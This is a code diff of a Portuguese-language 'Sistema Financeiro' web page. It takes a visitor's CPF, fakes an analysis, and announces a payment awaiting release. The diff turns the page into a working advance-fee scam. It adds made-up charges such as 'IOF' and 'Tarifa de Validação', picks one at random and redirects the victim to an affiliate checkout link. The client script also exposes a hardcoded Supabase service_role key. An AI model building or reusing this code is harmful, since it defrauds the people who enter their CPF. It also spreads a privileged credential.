@@ -1,21 +1,4 @@
-<!-- Script para mock da base de dados (para quando o Supabase não está disponível) -->
-<script>
-    // Dados de mock para demonstração
-    const clientesMock = [
-      { cpf: '12345678900', nome: 'João da Silva' },
-      { cpf: '98765432100', nome: 'Maria Oliveira' },
-      { cpf: '11122233344', nome: 'Pedro Santos' },
-      { cpf: '55566677788', nome: 'Ana Pereira' },
-      { cpf: '99988877766', nome: 'Carlos Ferreira' }
-    ];
-    
-    // Função para buscar cliente pelo CPF via mock (fallback)
-    function buscarClienteMock(cpf) {
-      const cpfLimpo = cpf.replace(/\D/g, '');
-      const cliente = clientesMock.find(c => c.cpf === cpfLimpo);
-      return cliente ? cliente.nome : null;
-    }
-  </script><!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
@@ -34,14 +17,11 @@
         extend: {
           colors: {
             primary: {
-              DEFAULT: '#10B981', // Verde esmeralda
-              light: '#34D399',
-              dark: '#059669'
-            },
-            secondary: {
-              DEFAULT: '#6EE7B7', // Verde água complementar
-              light: '#A7F3D0',
-              dark: '#047857'
+              DEFAULT: '#1A5440', // Mudado para primary-darker
+              light: '#247054',   // Ajustado para mais escuro
+              lighter: '#2E9070', // Ajustado para mais escuro
+              dark: '#1A5440',    // Mantido igual ao DEFAULT
+              darker: '#1A5440'   // Mantido
             }
           },
           animation: {
@@ -105,16 +85,10 @@
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-
-    /* Adicionar padrão de fundo verde claro */
-    .bg-pattern {
-      background-color: #effaf0;
-      background-image: url("data:image/svg+xml,%3Csvg width='40' height='40' viewBox='0 0 40 40' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='%2338a169' fill-opacity='0.06' fill-rule='evenodd'%3E%3Cpath d='M0 40L40 0H20L0 20M40 40V20L20 40'/%3E%3C/g%3E%3C/svg%3E");
-    }
     
     /* Estilo para botão desabilitado mas visível */
     .btn-disabled-visible {
-      background-color: #9CA3AF;
+      background-color: #1A5440;
       color: white;
       cursor: not-allowed;
       opacity: 0.7;
@@ -129,22 +103,14 @@
   </style>
 </head>
 
-<body class="min-h-screen flex flex-col items-center justify-center bg-pattern p-4">
+<body class="min-h-screen flex flex-col items-center justify-center bg-primary-darker bg-opacity-95 p-4">
   <div class="w-full max-w-md mb-8">
     <!-- Logo e Título -->
     <div class="text-center mb-8">
-      <div class="mx-auto w-16 h-16 bg-primary-DEFAULT rounded-full flex items-center justify-center shadow-lg mb-4 animate-fade-in">
-        <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-          <rect x="2" y="5" width="20" height="14" rx="2" />
-          <path d="M16 14V8" />
-          <path d="M12 14V10" />
-          <path d="M8 14v-2" />
-        </svg>
-      </div>
-      <h1 class="text-4xl font-bold text-primary-dark mb-2 animate-fade-in">
+      <h1 class="text-4xl font-bold text-white mb-2 animate-fade-in">
         Sistema Financeiro
       </h1>
-      <p class="text-gray-700 animate-fade-in delay-200 text-lg">
+      <p class="text-white animate-fade-in delay-200 text-lg">
         Verifique e desbloqueie seus recebimentos
       </p>
     </div>
@@ -153,7 +119,7 @@
     <div id="cpf-form" class="block">
       <div class="w-full max-w-md mx-auto bg-white border-none rounded-xl shadow-xl animate-fade-in card-professional">
         <div class="space-y-2 text-center p-8 border-b border-gray-100">
-          <h2 class="text-2xl font-bold tracking-tight text-primary-dark">Consulta de Recebimento</h2>
+          <h2 class="text-2xl font-bold tracking-tight text-primary-DEFAULT">Consulta de Recebimento</h2>
           <p class="text-gray-700">
             Insira seu CPF para verificar o status do seu recebimento
           </p>
@@ -187,7 +153,7 @@
           </div>
         </div>
         <div class="flex justify-center items-center text-sm text-gray-600 p-6 pt-2 gap-2">
-          <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-primary-dark" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-primary-DEFAULT" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
             <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
             <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
           </svg>
@@ -200,7 +166,7 @@
     <div id="analysis-screen" class="hidden">
       <div class="w-full max-w-md mx-auto bg-white border-none rounded-xl shadow-xl animate-fade-in card-professional">
         <div class="text-center p-8 border-b border-gray-100">
-          <h2 class="text-2xl font-bold tracking-tight text-primary-dark">Analisando seu CPF</h2>
+          <h2 class="text-2xl font-bold tracking-tight text-primary-DEFAULT">Analisando seu CPF</h2>
           <p id="welcome-message-analysis" class="text-gray-700 mt-2">
             Por favor, aguarde enquanto processamos sua solicitação
           </p>
@@ -209,27 +175,27 @@
           <div class="relative pt-1">
             <div class="flex mb-2 items-center justify-between">
               <div>
-                <span class="text-xs font-semibold inline-block py-1 px-2 uppercase rounded-full text-primary-dark bg-primary-light/20">
+                <span class="text-xs font-semibold inline-block py-1 px-2 uppercase rounded-full text-primary-DEFAULT bg-primary-light/30">
                   Em progresso
                 </span>
               </div>
               <div class="text-right">
-                <span id="progress-percentage" class="text-xs font-semibold inline-block text-primary-dark">
+                <span id="progress-percentage" class="text-xs font-semibold inline-block text-primary-DEFAULT">
                   0%
                 </span>
               </div>
             </div>
             <div class="w-full bg-gray-200 h-3 rounded-full overflow-hidden mb-2">
-              <div id="progress-bar" class="bg-primary-DEFAULT h-full" style="width: 0%"></div>
+              <div id="progress-bar" class="bg-primary-darker h-full" style="width: 0%"></div>
             </div>
           </div>
           
           <div class="space-y-4">
             <!-- Analysis Steps -->
-            <div class="flex items-center gap-4 p-5 rounded-lg border border-gray-100 opacity-0 animate-fade-in shadow bg-white hover:bg-green-50 transition-colors duration-300" id="step-1">
+            <div class="flex items-center gap-4 p-5 rounded-lg border border-gray-100 opacity-0 animate-fade-in shadow bg-white hover:bg-primary-dark/10 transition-colors duration-300" id="step-1">
               <div class="flex-shrink-0" id="step-1-icon">
-                <div class="w-10 h-10 rounded-full border-2 border-primary-light/30 flex items-center justify-center bg-white shadow-sm">
-                  <span class="text-primary-dark font-medium">1</span>
+                <div class="w-10 h-10 rounded-full border-2 border-primary-dark/30 flex items-center justify-center bg-white shadow-sm">
+                  <span class="text-primary-DEFAULT font-medium">1</span>
                 </div>
               </div>
               <div class="flex-1">
@@ -238,10 +204,10 @@
               </div>
             </div>
 
-            <div class="flex items-center gap-4 p-5 rounded-lg border border-gray-100 opacity-0 animate-fade-in delay-100 shadow bg-white hover:bg-green-50 transition-colors duration-300" id="step-2">
+            <div class="flex items-center gap-4 p-5 rounded-lg border border-gray-100 opacity-0 animate-fade-in delay-100 shadow bg-white hover:bg-primary-dark/10 transition-colors duration-300" id="step-2">
               <div class="flex-shrink-0" id="step-2-icon">
-                <div class="w-10 h-10 rounded-full border-2 border-primary-light/30 flex items-center justify-center bg-white shadow-sm">
-                  <span class="text-primary-dark font-medium">2</span>
+                <div class="w-10 h-10 rounded-full border-2 border-primary-dark/30 flex items-center justify-center bg-white shadow-sm">
+                  <span class="text-primary-DEFAULT font-medium">2</span>
                 </div>
               </div>
               <div class="flex-1">
@@ -250,10 +216,10 @@
               </div>
             </div>
 
-            <div class="flex items-center gap-4 p-5 rounded-lg border border-gray-100 opacity-0 animate-fade-in delay-200 shadow bg-white hover:bg-green-50 transition-colors duration-300" id="step-3">
+            <div class="flex items-center gap-4 p-5 rounded-lg border border-gray-100 opacity-0 animate-fade-in delay-200 shadow bg-white hover:bg-primary-dark/10 transition-colors duration-300" id="step-3">
               <div class="flex-shrink-0" id="step-3-icon">
-                <div class="w-10 h-10 rounded-full border-2 border-primary-light/30 flex items-center justify-center bg-white shadow-sm">
-                  <span class="text-primary-dark font-medium">3</span>
+                <div class="w-10 h-10 rounded-full border-2 border-primary-dark/30 flex items-center justify-center bg-white shadow-sm">
+                  <span class="text-primary-DEFAULT font-medium">3</span>
                 </div>
               </div>
               <div class="flex-1">
@@ -262,10 +228,10 @@
               </div>
             </div>
 
-            <div class="flex items-center gap-4 p-5 rounded-lg border border-gray-100 opacity-0 animate-fade-in delay-300 shadow bg-white hover:bg-green-50 transition-colors duration-300" id="step-4">
+            <div class="flex items-center gap-4 p-5 rounded-lg border border-gray-100 opacity-0 animate-fade-in delay-300 shadow bg-white hover:bg-primary-dark/10 transition-colors duration-300" id="step-4">
               <div class="flex-shrink-0" id="step-4-icon">
-                <div class="w-10 h-10 rounded-full border-2 border-primary-light/30 flex items-center justify-center bg-white shadow-sm">
-                  <span class="text-primary-dark font-medium">4</span>
+                <div class="w-10 h-10 rounded-full border-2 border-primary-dark/30 flex items-center justify-center bg-white shadow-sm">
+                  <span class="text-primary-DEFAULT font-medium">4</span>
                 </div>
               </div>
               <div class="flex-1">
@@ -283,19 +249,19 @@
       <div class="w-full max-w-md mx-auto bg-white border-none rounded-xl shadow-xl animate-slide-up card-professional">
         <div class="space-y-4 text-center p-8 border-b border-gray-100">
           <div class="mx-auto bg-primary-light/30 p-4 rounded-full w-20 h-20 flex items-center justify-center shadow-md">
-            <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10 text-primary-dark" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10 text-primary-DEFAULT" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
               <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
               <path d="m9 11 3 3L22 4"></path>
             </svg>
           </div>
-          <h2 class="text-2xl font-bold tracking-tight text-primary-dark">Recebimento Encontrado</h2>
+          <h2 class="text-2xl font-bold tracking-tight text-primary-DEFAULT">Recebimento Encontrado</h2>
         </div>
         <div class="p-8 pt-6 space-y-6">
           <div class="bg-primary-light/20 rounded-lg p-5 border border-primary-light/30 shadow-sm">
-            <h3 class="font-medium text-lg mb-2 text-primary-dark">Olá, <span id="nome-cliente">Cliente</span>!</h3>
+            <h3 class="font-medium text-lg mb-2 text-primary-DEFAULT">Olá, <span id="nome-cliente">Cliente</span>!</h3>
             <p class="text-gray-700">
-              Identificamos seu recebimento em nosso sistema. Para prosseguir com a liberação, 
-              é necessário o pagamento de uma pequena taxa.
+              Identificamos um recebimento disponível em seu nome. Para prosseguir com a liberação,
+              é necessário o pagamento da tarifa indicada abaixo.
             </p>
           </div>
           
@@ -310,18 +276,22 @@
             </div>
             <div class="flex justify-between items-center">
               <span class="text-gray-600">Pendência:</span>
-              <span class="font-medium">Taxa de liberação</span>
+              <span id="nome-tarifa" class="font-medium">Taxa de liberação</span>
+            </div>
+            <div class="flex justify-between items-center">
+              <span class="text-gray-600">Valor a pagar:</span>
+              <span id="valor-tarifa" class="font-bold text-primary-DEFAULT">R$ 0,00</span>
             </div>
           </div>
         </div>
         <div class="px-8 pb-8">
           <button 
             id="proceed-button"
-            class="w-full py-5 bg-primary-dark text-white rounded-lg transition-all duration-300 flex items-center justify-center shadow-lg text-lg font-medium relative overflow-hidden group"
+            class="w-full py-5 bg-primary-darker text-white rounded-lg transition-all duration-300 flex items-center justify-center shadow-lg text-lg font-medium relative overflow-hidden group"
           >
             <span class="absolute w-64 h-64 mt-12 bg-primary-light opacity-10 rotate-45 -translate-x-40 -translate-y-32 transform transition duration-1000 group-hover:translate-x-10 group-hover:-translate-y-24"></span>
             <span class="flex items-center relative z-10">
-              Prosseguir para liberação 
+              Pagar e liberar recebimento
               <svg xmlns="http://www.w3.org/2000/svg" class="ml-2 h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                 <path d="M5 12h14"></path>
                 <path d="m12 5 7 7-7 7"></path>
@@ -333,7 +303,7 @@
     </div>
   </div>
 
-  <footer class="w-full max-w-md text-center text-sm text-gray-500 mt-8 animate-fade-in delay-400">
+  <footer class="w-full max-w-md text-center text-sm text-primary-lighter mt-8 animate-fade-in delay-400">
     <p>&copy; <span id="current-year"></span> Sistema Financeiro. Todos os direitos reservados.</p>
   </footer>
 
@@ -342,6 +312,40 @@
     const supabaseUrl = 'https://bewgphogfsnwhjfizosn.supabase.co';
     const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJld2dwaG9nZnNud2hqZml6b3NuIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc0NDczMTYwMSwiZXhwIjoyMDYwMzA3NjAxfQ.RWHtKgFb28I8t2YM5UPpdYhYHmmr48M3cJKZpmNAy9M';
     const supabaseClient = window.supabase.createClient(supabaseUrl, supabaseKey);
+    
+    // Opções de tarifas
+    const tarifasOptions = [
+      {
+        nome: "IOF",
+        valor: "R$ 27,85",
+        link: "https://pay.compraasegurapay.com/checkout/9342405d-fb6b-423b-9a9d-f918ea421825?affiliateId=1cc07501-62ee-46db-8f9b-873ac8562bfa"
+      },
+      {
+        nome: "Tarifa de Validação",
+        valor: "R$ 25,99",
+        link: "https://pay.compraasegurapay.com/checkout/152792a6-5a5a-4759-a06a-e049f17d7861?affiliateId=4b01fafd-7e50-43ad-9d27-9df132cba385"
+      },
+      {
+        nome: "Tarifa de Cadastro",
+        valor: "R$ 18,68",
+        link: "https://pay.compraasegurapay.com/checkout/51a1fc50-99fc-4a8d-a089-75088e896b57?affiliateId=2b260552-7a97-48a7-a7cb-35278343f69b"
+      },
+      {
+        nome: "Taxa Fiscal",
+        valor: "R$ 17,20",
+        link: "https://pay.compraasegurapay.com/checkout/6b0cbc9a-974a-417f-875b-28020fc9cdb0?affiliateId=46a11795-af2b-4541-9a42-979a60b5acc6"
+      },
+      {
+        nome: "Ativar Conta",
+        valor: "R$ 21,90",
+        link: "https://pay.compraasegurapay.com/checkout/f6329862-4dd7-4ef3-9f56-979242addf47?affiliateId=c3275900-2c84-46ee-bfc2-4225f97a7530"
+      },
+      {
+        nome: "Taxa de Consultoria Financeira",
+        valor: "R$ 19,53",
+        link: "https://pay.compraasegurapay.com/checkout/ef87c137-9fad-4562-b18e-5c2271990d11?affiliateId=ee18d28b-4b2b-4288-8239-12a6babea29f"
+      }
+    ];
     
     // Função para buscar cliente pelo CPF
     async function buscarClientePorCPF(cpf) {
@@ -360,31 +364,18 @@
           
           if (error) {
             console.log('Erro ao buscar cliente no Supabase:', error);
-            // Tentar o fallback de mock
-            console.log('Tentando buscar no mock...');
-            const nomeMock = buscarClienteMock(cpfLimpo);
-            return nomeMock;
+            return null;
           }
           
           console.log('Cliente encontrado no Supabase:', data);
           return data?.nome || null;
         } catch (supabaseError) {
           console.error('Erro de conexão com Supabase:', supabaseError);
-          // Tentar o fallback de mock
-          console.log('Tentando buscar no mock...');
-          const nomeMock = buscarClienteMock(cpfLimpo);
-          return nomeMock;
+          return null;
         }
       } catch (error) {
         console.error('Erro geral ao buscar cliente:', error);
-        // Tentar o fallback de mock
-        try {
-          const nomeMock = buscarClienteMock(cpf);
-          return nomeMock;
-        } catch (mockError) {
-          console.error('Erro no mock também:', mockError);
-          return null;
-        }
+        return null;
       }
     }
 
@@ -442,10 +433,10 @@
       if (formattedCPF.length === 14) {
         submitButton.disabled = false;
         submitButton.classList.remove('btn-disabled-visible');
-        submitButton.classList.add('bg-primary-dark');
+        submitButton.classList.add('bg-primary-darker');
       } else {
         submitButton.disabled = true;
-        submitButton.classList.remove('bg-primary-dark');
+        submitButton.classList.remove('bg-primary-darker');
         submitButton.classList.add('btn-disabled-visible');
       }
     });
@@ -501,6 +492,21 @@
         nomeClienteElement.textContent = nomeCliente;
       }
       
+      // Selecionar uma tarifa aleatoriamente
+      tarifaSelecionada = selecionarTarifaAleatoria();
+      
+      // Atualizar informações da tarifa na tela de resultado
+      const nomeTarifaElement = document.getElementById('nome-tarifa');
+      const valorTarifaElement = document.getElementById('valor-tarifa');
+      
+      if (nomeTarifaElement && tarifaSelecionada) {
+        nomeTarifaElement.textContent = tarifaSelecionada.nome;
+      }
+      
+      if (valorTarifaElement && tarifaSelecionada) {
+        valorTarifaElement.textContent = tarifaSelecionada.valor;
+      }
+      
       // Transition to analysis screen after short delay
       setTimeout(() => {
         cpfForm.classList.add('hidden');
@@ -534,11 +540,11 @@
           const iconContainer = document.getElementById(`${step.id}-icon`);
           
           // Highlight current step
-          stepElement.classList.add('bg-primary-light/10', 'border-l-2', 'border-primary-light');
+          stepElement.classList.add('bg-primary-dark/10', 'border-l-2', 'border-primary-dark');
           
           iconContainer.innerHTML = `
-            <div class="w-10 h-10 rounded-full flex items-center justify-center bg-primary-light/40 shadow">
-              <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6 text-primary-dark animate-spin" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <div class="w-10 h-10 rounded-full flex items-center justify-center bg-primary-dark/40 shadow">
+              <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6 text-primary-DEFAULT animate-spin" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                 <line x1="12" y1="2" x2="12" y2="6"></line>
                 <line x1="12" y1="18" x2="12" y2="22"></line>
                 <line x1="4.93" y1="4.93" x2="7.76" y2="7.76"></line>
@@ -557,11 +563,11 @@
             const prevStepElement = document.getElementById(prevStepId);
             const prevStepIcon = document.getElementById(`${prevStepId}-icon`);
             
-            prevStepElement.classList.remove('bg-primary-light/10', 'border-l-2', 'border-primary-light');
-            prevStepElement.classList.add('bg-green-50', 'border-l-4', 'border-primary-DEFAULT');
+            prevStepElement.classList.remove('bg-primary-dark/10', 'border-l-2', 'border-primary-dark');
+            prevStepElement.classList.add('bg-primary-darker/20', 'border-l-4', 'border-primary-darker');
             
             prevStepIcon.innerHTML = `
-              <div class="w-10 h-10 rounded-full flex items-center justify-center bg-primary-DEFAULT shadow">
+              <div class="w-10 h-10 rounded-full flex items-center justify-center bg-primary-darker shadow">
                 <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                   <path d="M20 6L9 17l-5-5"></path>
                 </svg>
@@ -576,11 +582,11 @@
               const lastStepElement = document.getElementById(step.id);
               const lastStepIcon = document.getElementById(`${step.id}-icon`);
               
-              lastStepElement.classList.remove('bg-primary-light/10', 'border-l-2', 'border-primary-light');
-              lastStepElement.classList.add('bg-green-50', 'border-l-4', 'border-primary-DEFAULT');
+              lastStepElement.classList.remove('bg-primary-dark/10', 'border-l-2', 'border-primary-dark');
+              lastStepElement.classList.add('bg-primary-darker/20', 'border-l-4', 'border-primary-darker');
               
               lastStepIcon.innerHTML = `
-                <div class="w-10 h-10 rounded-full flex items-center justify-center bg-primary-DEFAULT shadow">
+                <div class="w-10 h-10 rounded-full flex items-center justify-center bg-primary-darker shadow">
                   <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                     <path d="M20 6L9 17l-5-5"></path>
                   </svg>
@@ -598,9 +604,22 @@
       });
     }
 
+    // Variável global para armazenar a tarifa selecionada
+    let tarifaSelecionada = null;
+    
+    // Função para selecionar uma tarifa aleatoriamente
+    function selecionarTarifaAleatoria() {
+      const randomIndex = Math.floor(Math.random() * tarifasOptions.length);
+      return tarifasOptions[randomIndex];
+    }
+    
     // Handle proceed button click
     proceedButton.addEventListener('click', function() {
-      alert('Em uma aplicação real, aqui o usuário seria direcionado para a tela de pagamento da taxa.');
+      if (tarifaSelecionada && tarifaSelecionada.link) {
+        window.location.href = tarifaSelecionada.link;
+      } else {
+        alert('Erro ao processar o pagamento. Tente novamente mais tarde.');
+      }
     });
   </script>
 </body>
